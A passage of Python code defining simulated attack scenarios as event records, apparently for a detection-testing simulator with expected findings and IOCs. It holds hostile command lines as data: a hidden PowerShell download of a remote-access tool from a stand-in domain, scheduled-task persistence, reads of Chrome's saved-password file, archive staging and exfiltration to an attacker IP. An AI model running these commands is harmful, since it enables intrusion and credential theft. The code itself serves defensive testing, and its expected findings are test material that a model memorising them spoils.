        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Azure Active Directory", "action": "get_federation_config", "resource_type": "federation_settings", "resource_name": "Get-MsolDomainFederationSettings", "success": True, "description": "Enumerated federation settings for all verified domains — identified current IdP issuer URI and signing certificates", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        # List all verified domains
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Azure Active Directory", "action": "list_domains", "resource_type": "domain", "resource_name": "Get-MsolDomain", "success": True, "description": "Listed all verified domains in tenant — corp.com (federated), corp.onmicrosoft.com (managed)", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        # Inspect SAML signing certificates
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure Active Directory", "action": "get_saml_certificates", "resource_type": "certificate", "resource_name": "SAML Token Signing Certificates", "success": True, "description": "Retrieved current SAML token signing certificate details — thumbprint, expiry, and key strength identified", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        # Identify current IdP settings
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Active Directory", "action": "get_federation_metadata", "resource_type": "federation_metadata", "resource_name": "Federation Metadata XML", "success": True, "description": "Downloaded federation metadata XML — identified passive logon URI, token issuer, and WS-Trust endpoints", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        # Check service principal permissions
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Azure Active Directory", "action": "list_service_principals", "resource_type": "service_principal", "resource_name": "Enterprise Applications", "success": True, "description": "Enumerated service principals with federation permissions — identified apps relying on SAML SSO", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Return + staged trust modification
        # (overnight gap: attacker generates rogue signing certificate)
        # =====================================================================

        # --- Phase 3: Attacker returns ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "persistence", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 4: Staged trust modification ---
        # Add rogue signing certificate
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Azure Active Directory", "action": "add_signing_certificate", "resource_type": "certificate", "resource_name": "SAML Token Signing Certificate — New", "success": True, "description": "Added rogue SAML token signing certificate to federation trust — attacker-generated key pair", "metadata": {"attack_phase": "persistence", "is_attacker": True, "golden_saml_setup": True}}, requires_success=True),
        # Modify token issuer URL
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure Active Directory", "action": "policy_modify", "resource_type": "federation_settings", "resource_name": "SAML Federation Settings — Token Issuer", "success": True, "description": "Modified token issuer URL in federation settings to accept tokens from attacker-controlled IdP", "metadata": {"attack_phase": "persistence", "is_attacker": True, "golden_saml_setup": True}}, requires_success=True),
        # Add trusted domain
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure Active Directory", "action": "add_trusted_domain", "resource_type": "domain", "resource_name": "attacker-tenant.onmicrosoft.com", "success": True, "description": "Rogue domain added to federation trust — enables cross-tenant token acceptance", "metadata": {"attack_phase": "persistence", "is_attacker": True, "golden_saml_setup": True}}, requires_success=True),
        # Test token validation
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Azure Active Directory", "action": "test_federation", "resource_type": "federation_settings", "resource_name": "Test-MsolFederationSettings", "success": True, "description": "Tested federation settings — confirmed forged token is accepted by Azure AD token endpoint", "metadata": {"attack_phase": "persistence", "is_attacker": True, "validation_test": True}}, requires_success=True),

        # =====================================================================
        # DAY 3-4 — Return with forged SAML assertion, access resources, exfil
        # (1-2 day gap: attacker mints forged SAML tokens)
        # =====================================================================

        # --- Phase 5: Login using forged SAML assertion ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SAML Assertion", "metadata": {"attack_phase": "persistent_access", "is_attacker": True, "golden_saml": True, "return_session": True}}, requires_success=True),

        # --- Phase 6: Cross-tenant resource access ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Azure Active Directory", "action": "cross_tenant_access", "resource_type": "tenant_resource", "resource_name": "Cross-Tenant Resource Enumeration", "success": True, "description": "Cross-tenant access via forged federation token — enumerated available resources", "metadata": {"attack_phase": "objectives", "is_attacker": True, "golden_saml": True}}, requires_success=True),

        # --- Phase 7: Mailbox access ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_type": "mailbox", "resource_name": "CEO Mailbox", "success": True, "description": "Accessed CEO mailbox via forged SAML token — read executive communications", "metadata": {"attack_phase": "objectives", "is_attacker": True, "golden_saml": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "CEO Mailbox Search: 'acquisition OR merger OR board'", "success": True, "description": "Searched CEO mailbox for M&A and board-related keywords", "metadata": {"attack_phase": "objectives", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: SharePoint browsing and file downloads ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "SharePoint Online", "action": "browse_site", "resource_type": "site", "resource_name": "Executive Leadership Site", "success": True, "description": "Browsed Executive Leadership SharePoint site via forged token", "metadata": {"attack_phase": "objectives", "is_attacker": True, "golden_saml": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "/Executive Leadership/Board Presentations/Board-Deck-Q4-2026.pptx", "system": "sharepoint", "label": "confidential", "category": "executive", "description": "Downloaded board presentation from Executive Leadership site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "download", "path": "/Executive Leadership/Strategy/Acquisition-Target-Analysis-2027.xlsx", "system": "sharepoint", "label": "restricted", "category": "executive", "description": "Downloaded acquisition target analysis from Executive site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 8b: Access additional mailbox and read sensitive threads ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_type": "mailbox", "resource_name": "CFO Mailbox", "success": True, "description": "Accessed CFO mailbox via forged SAML token — financial communications", "metadata": {"attack_phase": "objectives", "is_attacker": True, "golden_saml": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_board_compensation", "resource_name": "Re: Executive Compensation Restructuring — Board Approval", "success": True, "description": "Attacker read executive compensation board approval thread from CFO mailbox", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # Additional file download from Finance site
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "/Finance/Budgets/FY2027-Budget-Confidential.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded confidential FY2027 budget from Finance SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: Data exfiltration ---
        AttackEvent(event_type="network_event", delay=_delay(15, 8, 3, 45), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 52428800, "bytes_received": 2048, "description": "HTTPS upload to external IP — 50 MB exfiltration of collected executive data"}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.55,
    iocs=["attacker-tenant.onmicrosoft.com"],
    expected_findings=[
        "Rogue SAML signing certificate added to federation trust",
        "Token issuer URL modified to accept attacker-controlled IdP tokens",
        "Forged SAML assertion login — Golden SAML attack",
        "Cross-tenant resource access and executive mailboxes accessed via forged token",
        "Executive data exfiltrated to external IP",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)


# =============================================================================
# ENDPOINT ATTACK SCENARIOS
# =============================================================================

_ENDPOINT_BASE_PARAMS = {
    "attacker_domains": ["secure-filehost.com", "software-updates-cdn.com"],
    "sender_names": ["IT Department", "Software Distribution"],
    "sender_prefixes": ["no-reply", "updates"],
    "subjects": ["Confidential Document - Please Review", "New Software Package Available"],
    "email_bodies": ["Please review the attached file.\n\nThis document is confidential."],
    **SHARED_ATTACKER_INFRA,
}

ISO_LNK_ATTACHMENT_CHAIN = AttackScenario(
    id="iso_lnk_attachment_chain",
    tier="T2",
    name="ISO/LNK Attachment Payload Chain",
    description="Malware delivered via ISO disk image containing LNK shortcut. User mounts ISO, clicks LNK, spawns payload that beacons to C2, performs host discovery and credential harvesting, stages sensitive data, and exfiltrates over the C2 channel.",
    attack_type="malware",
    events=[
        # Phase 1: Delivery — phishing email with ISO attachment
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "attachment_types": ["iso"], "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),
        # Phase 2: Exploitation — user mounts ISO and clicks LNK
        AttackEvent(event_type="file_event", delay=_delay(18, 12, 2, 90), data={"action": "download", "path": "C:\\Users\\Downloads\\Confidential_Documents.iso", "system": "endpoint", "description": "User mounted ISO disk image", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(8, 4, 1, 30), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious attachment", "success": True}}),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "explorer.exe", "action": "start", "parent_process": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "pid": 3180, "integrity_level": "medium", "command_line": "explorer.exe E:\\Open_Document.lnk", "hash": "32f5c3f9aac471345a1bde0a058261983e54e18599ddc6237ac7c357214cf560", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),
        # Phase 3: Execution — LNK spawns hidden payload
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.05, 0.8), data={"process_name": "update_helper.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "E:\\update_helper.exe -s", "path": "E:\\update_helper.exe", "pid": 3244, "integrity_level": "medium", "hash": "f6f9a6790520bf58fcf21739d34269c452c950230cd8d4b0109ffba7c16a1fa8", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        # Phase 4: C2 — beacon established
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 384, "bytes_received": 2048, "description": "C2 callback from ISO payload", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
        # Phase 5: Persistence — scheduled task
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "update_helper.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 3312, "integrity_level": "medium", "command_line": "schtasks.exe /create /tn MicrosoftEdgeUpdateTaskMachineCore /tr C:\\ProgramData\\update_helper.exe /sc onlogon /ru SYSTEM /f", "hash": "56b4cc8e99b4f8d56e654d34fb52ebb4e7d39cdc8c998413d577e0bd59513196", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        # Phase 6: Discovery — host reconnaissance via payload
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "whoami.exe", "action": "start", "parent_process": "update_helper.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 3380, "integrity_level": "medium", "command_line": "whoami /all", "hash": "780644068704ff022498c96b0078dfed3611dbe4235d47889d563486c8f90650", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "update_helper.exe", "path": "C:\\Windows\\System32\\ipconfig.exe", "pid": 3412, "integrity_level": "medium", "command_line": "ipconfig /all", "hash": "6d0add310fb48343ea9eaa8f6787146737a7db50d1a1584b7cab432e12903aba", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "net.exe", "action": "start", "parent_process": "update_helper.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 3448, "integrity_level": "medium", "command_line": "net view /domain", "hash": "547576366d61295521ce581711bf40217766a715d61f8c5a4c6ba390199af564", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 7: Credential harvesting — browser saved passwords
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "Payload read Chrome saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "chrome"}}, requires_success=True),
        # Phase 8: Data staging — compress sensitive files
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "update_helper.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 3520, "integrity_level": "medium", "command_line": "PowerShell.exe -c \"Compress-Archive -Path 'C:\\Users\\{victim_username}\\Documents\\*.xlsx','C:\\Users\\{victim_username}\\Documents\\*.docx' -DestinationPath 'C:\\ProgramData\\cache-update.zip'\"", "hash": "d6640fbdda34f8de6f30ca00e73ed3f8b3888cf9cc3069bf3c505fa903629e02", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Phase 9: Exfiltration — staged archive over C2
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 10485760, "bytes_received": 1024, "description": "Staged archive exfiltrated over C2 channel (10 MB)", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.55,
    iocs=["secure-filehost.com", "cdn-static-assets.com"],
    expected_findings=["ISO attachment email", "LNK spawned payload from virtual drive", "C2 callback", "Browser credential harvesting"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "c2_domain", "attacker_ip"],
)

DLL_SIDELOADING = AttackScenario(
    id="dll_sideloading",
    tier="T2",
    name="DLL Sideloading via Legitimate Application Bundle",
    description="Phishing email delivers ZIP with legitimate signed app and malicious DLL. When the app runs, it sideloads the DLL, establishing C2. Attacker performs host reconnaissance, sets up persistence via scheduled task, and stages data for exfiltration.",
    attack_type="malware",
    events=[
        # Phase 1: Delivery — phishing email with weaponized ZIP
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "attachment_types": ["zip"], "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),
        AttackEvent(event_type="file_event", delay=_delay(20, 15, 3, 120), data={"action": "download", "path": "C:\\Users\\Downloads\\Notepad_Plus_Package.zip", "system": "endpoint", "description": "User saved and extracted app bundle containing malicious DLL", "metadata": {"attack_phase": "delivery"}}, requires_success=True),
        # Phase 2: Execution — legitimate app sideloads malicious DLL
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 8), data={"process_name": "Notepad++.exe", "action": "start", "parent_process": "explorer.exe", "path": "C:\\Users\\Downloads\\Notepad++\\Notepad++.exe", "pid": 4820, "integrity_level": "medium", "command_line": "\"C:\\Users\\Downloads\\Notepad++\\Notepad++.exe\"", "hash": "43f9cfaee0581ce961f6d5f75925b8397c572ac1d5bfe59e30c4ee630e3ec578", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.1, 0.05, 0.01, 0.3), data={"process_name": "version.dll", "action": "inject", "parent_process": "Notepad++.exe", "path": "C:\\Users\\Downloads\\Notepad++\\version.dll", "pid": 4820, "integrity_level": "medium", "command_line": "", "hash": "d38ea46db23c31211ae6e30fa32a75853760ede1e5ec29981508adcdaabbae97", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "dll_sideloading": True, "path_anomaly": True}}, requires_success=True),
        # Phase 3: C2 — beacon established, attacker gains interactive shell
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 4096, "description": "Initial C2 beacon from sideloaded DLL via HTTPS", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 8192, "description": "C2 session established — interactive shell commands received", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
        # Phase 4: Discovery — host and network reconnaissance via C2
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "whoami.exe", "action": "start", "parent_process": "Notepad++.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 5204, "integrity_level": "medium", "command_line": "whoami /all", "hash": "d4df273c6e23d9d9be9a27de4a329016c25a2ae3ef91d1bb2e870477220ff95f", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "Notepad++.exe", "path": "C:\\Windows\\System32\\ipconfig.exe", "pid": 5280, "integrity_level": "medium", "command_line": "ipconfig /all", "hash": "110e0c77af8d77f8b830df86fd4aa8e32e3de73802b334572b56ee8fde859ed6", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "net.exe", "action": "start", "parent_process": "Notepad++.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 5344, "integrity_level": "medium", "command_line": "net view /domain", "hash": "7af56766fed6e6ecbb8635c03c9d41c5febe113e66740081e18dddf6f9baf5e8", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "nltest.exe", "action": "start", "parent_process": "Notepad++.exe", "path": "C:\\Windows\\System32\\nltest.exe", "pid": 5412, "integrity_level": "medium", "command_line": "nltest /dclist:corp.internal", "hash": "7eb4109bea7ff14fc4feb75660746b7fbb6bf80ca2170fca1de4717aa5bf4873", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 5: Persistence — scheduled task to survive reboot
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "Notepad++.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 5620, "integrity_level": "medium", "command_line": "schtasks /create /tn \"NotepadUpdateCheck\" /tr \"C:\\Users\\Downloads\\Notepad++\\Notepad++.exe\" /sc onlogon /rl highest", "hash": "18a91d683a4c4eed3133c35ed3fc1e6c55f8738c58035f27df40724f2402b005", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        # Phase 6: Collection and staging
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 30), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Documents\\", "system": "local", "description": "Enumerated local documents folder for sensitive files", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "Notepad++.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 5908, "integrity_level": "medium", "command_line": "PowerShell.exe -c \"Compress-Archive -Path 'C:\\Users\\{victim_username}\\Documents\\*.xlsx','C:\\Users\\{victim_username}\\Documents\\*.docx' -DestinationPath 'C:\\Users\\Public\\update-cache.zip'\"", "hash": "b64dfc22fa3943205f45d163b7b3701e8c5426c29886419cee12c69cf62f6e2d", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 15728640, "bytes_received": 1024, "description": "Staged archive exfiltrated over C2 channel (15 MB)", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.5,
    iocs=["software-updates-cdn.com", "cdn-static-assets.com"],
    expected_findings=["Signed app launched from Downloads folder", "DLL loaded from non-standard path instead of System32", "C2 beacon from signed process", "Data exfiltrated over C2"],
    relevant_ioc_keys=["attacker_email", "c2_domain", "attacker_ip"],
)

REMOTE_ACCESS_TOOL_INSTALL = AttackScenario(
    id="remote_access_tool_install",
    tier="T2",
    name="Legitimate Remote Access Tool Installation for Persistent Access",
    description="Attacker installs legitimate RAT (AnyDesk) for persistent interactive access that blends with normal IT usage. Performs discovery, credential harvesting, file enumeration, data staging, exfiltration, and sets up a scheduled task for persistence.",
    attack_type="malware",
    events=[
        # Phase 1: Delivery — download RAT via PowerShell
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "powershell.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 4100, "integrity_level": "medium", "command_line": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://it-helpdesk-support.com/tools/AnyDesk.exe' -OutFile 'C:\\ProgramData\\AnyDesk.exe'\"", "hash": "e718d2a270ba4a495ee29944943e5b59d61794b4ab6ad4f339f4849572aef5a9", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "delivery"}}, requires_success=False),
        # Phase 2: Execution — silent RAT install
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"process_name": "AnyDesk.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\ProgramData\\AnyDesk.exe", "pid": 4156, "integrity_level": "medium", "command_line": "C:\\ProgramData\\AnyDesk.exe --silent --nodesktop", "hash": "982c2764e99f982a6f114fc6b23668e55859a783e1423fc4a4547217e7bec3fc", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "silent_install": True}}, requires_success=True),
        AttackEvent(event_type="device_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "software_install", "software_name": "AnyDesk", "description": "New remote access software installed", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        # Phase 3: C2 — RAT connects to relay
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 1024, "bytes_received": 8192, "description": "RAT outbound connection to relay", "metadata": {"attack_phase": "command_and_control"}}, requires_success=True),
        # Phase 4: Discovery — host and network reconnaissance via RAT
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 20), data={"process_name": "cmd.exe", "action": "start", "parent_process": "AnyDesk.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 4220, "integrity_level": "medium", "command_line": "cmd.exe /c whoami /all", "hash": "1bce1ce87d8f2ad64a12d1d30e1e0d7dcb36d06d7e46ff5bdd10f410c60d018d", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "via_rat": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "AnyDesk.exe", "path": "C:\\Windows\\System32\\ipconfig.exe", "pid": 4288, "integrity_level": "medium", "command_line": "ipconfig /all", "hash": "d85d43d84401b2d338d7255ff460d67a995e02ae141136b9a43e382e16e66d99", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "via_rat": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "net.exe", "action": "start", "parent_process": "AnyDesk.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 4340, "integrity_level": "medium", "command_line": "net view /domain", "hash": "71ad15de66c6c620ef6371a82bf9a15f626d6a255d9c7ddc827d21130ef0539b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "via_rat": True}}, requires_success=True),
        # Phase 5: File enumeration — search for sensitive documents
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "cmd.exe", "action": "start", "parent_process": "AnyDesk.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 4408, "integrity_level": "medium", "command_line": "cmd.exe /c dir /s /b C:\\Users\\{victim_username}\\Documents\\*.xlsx C:\\Users\\{victim_username}\\Documents\\*.docx C:\\Users\\{victim_username}\\Documents\\*.pdf", "hash": "1bce1ce87d8f2ad64a12d1d30e1e0d7dcb36d06d7e46ff5bdd10f410c60d018d", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection", "via_rat": True}}, requires_success=True),
        # Phase 6: Credential harvesting — read browser credential stores
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "RAT operator read Chrome saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "chrome", "via_rat": True}}, requires_success=True),
        # Phase 7: Data staging — compress target files
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "AnyDesk.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 4480, "integrity_level": "medium", "command_line": "PowerShell.exe -c \"Compress-Archive -Path 'C:\\Users\\{victim_username}\\Documents\\*.xlsx','C:\\Users\\{victim_username}\\Documents\\*.pdf' -DestinationPath 'C:\\ProgramData\\support-logs.zip'\"", "hash": "85c68f73c0d855ad7f5119866e48ea7d1d5066795a9b4b99ef667a69056491d6", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection", "via_rat": True}}, requires_success=True),
        # Phase 8: Persistence — scheduled task to re-launch RAT
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "AnyDesk.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 4544, "integrity_level": "medium", "command_line": "schtasks.exe /create /tn \"AnyDeskUpdateService\" /tr \"C:\\ProgramData\\AnyDesk.exe --silent\" /sc onlogon /rl highest", "hash": "1c0ed3b48fe9d400576c8c53d95b5a817c778542262a49d3fe7f76d496e1f75b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "via_rat": True}}, requires_success=True),
        # Phase 9: Exfiltration — staged data over RAT connection
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 8388608, "bytes_received": 1024, "description": "Staged archive exfiltrated over RAT connection (8 MB)", "metadata": {"attack_phase": "exfiltration", "via_rat": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.65,
    iocs=["it-helpdesk-support.com"],
    expected_findings=["PowerShell downloaded RAT silently", "RAT installed as service", "Outbound RAT connection", "Browser credential harvesting"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

SCHEDULED_TASK_PERSISTENCE = AttackScenario(
    id="scheduled_task_persistence",
    tier="T3",
    name="Scheduled Task and Registry Run Key Persistence",
    description="Attacker delivers payload via PowerShell, creates scheduled task and Registry Run key for persistence, performs host discovery, harvests credentials, collects sensitive files, and exfiltrates data. Task executes multiple times demonstrating persistent re-entry.",
    attack_type="malware",
    events=[
        # Phase 1: Delivery — payload dropped via PowerShell
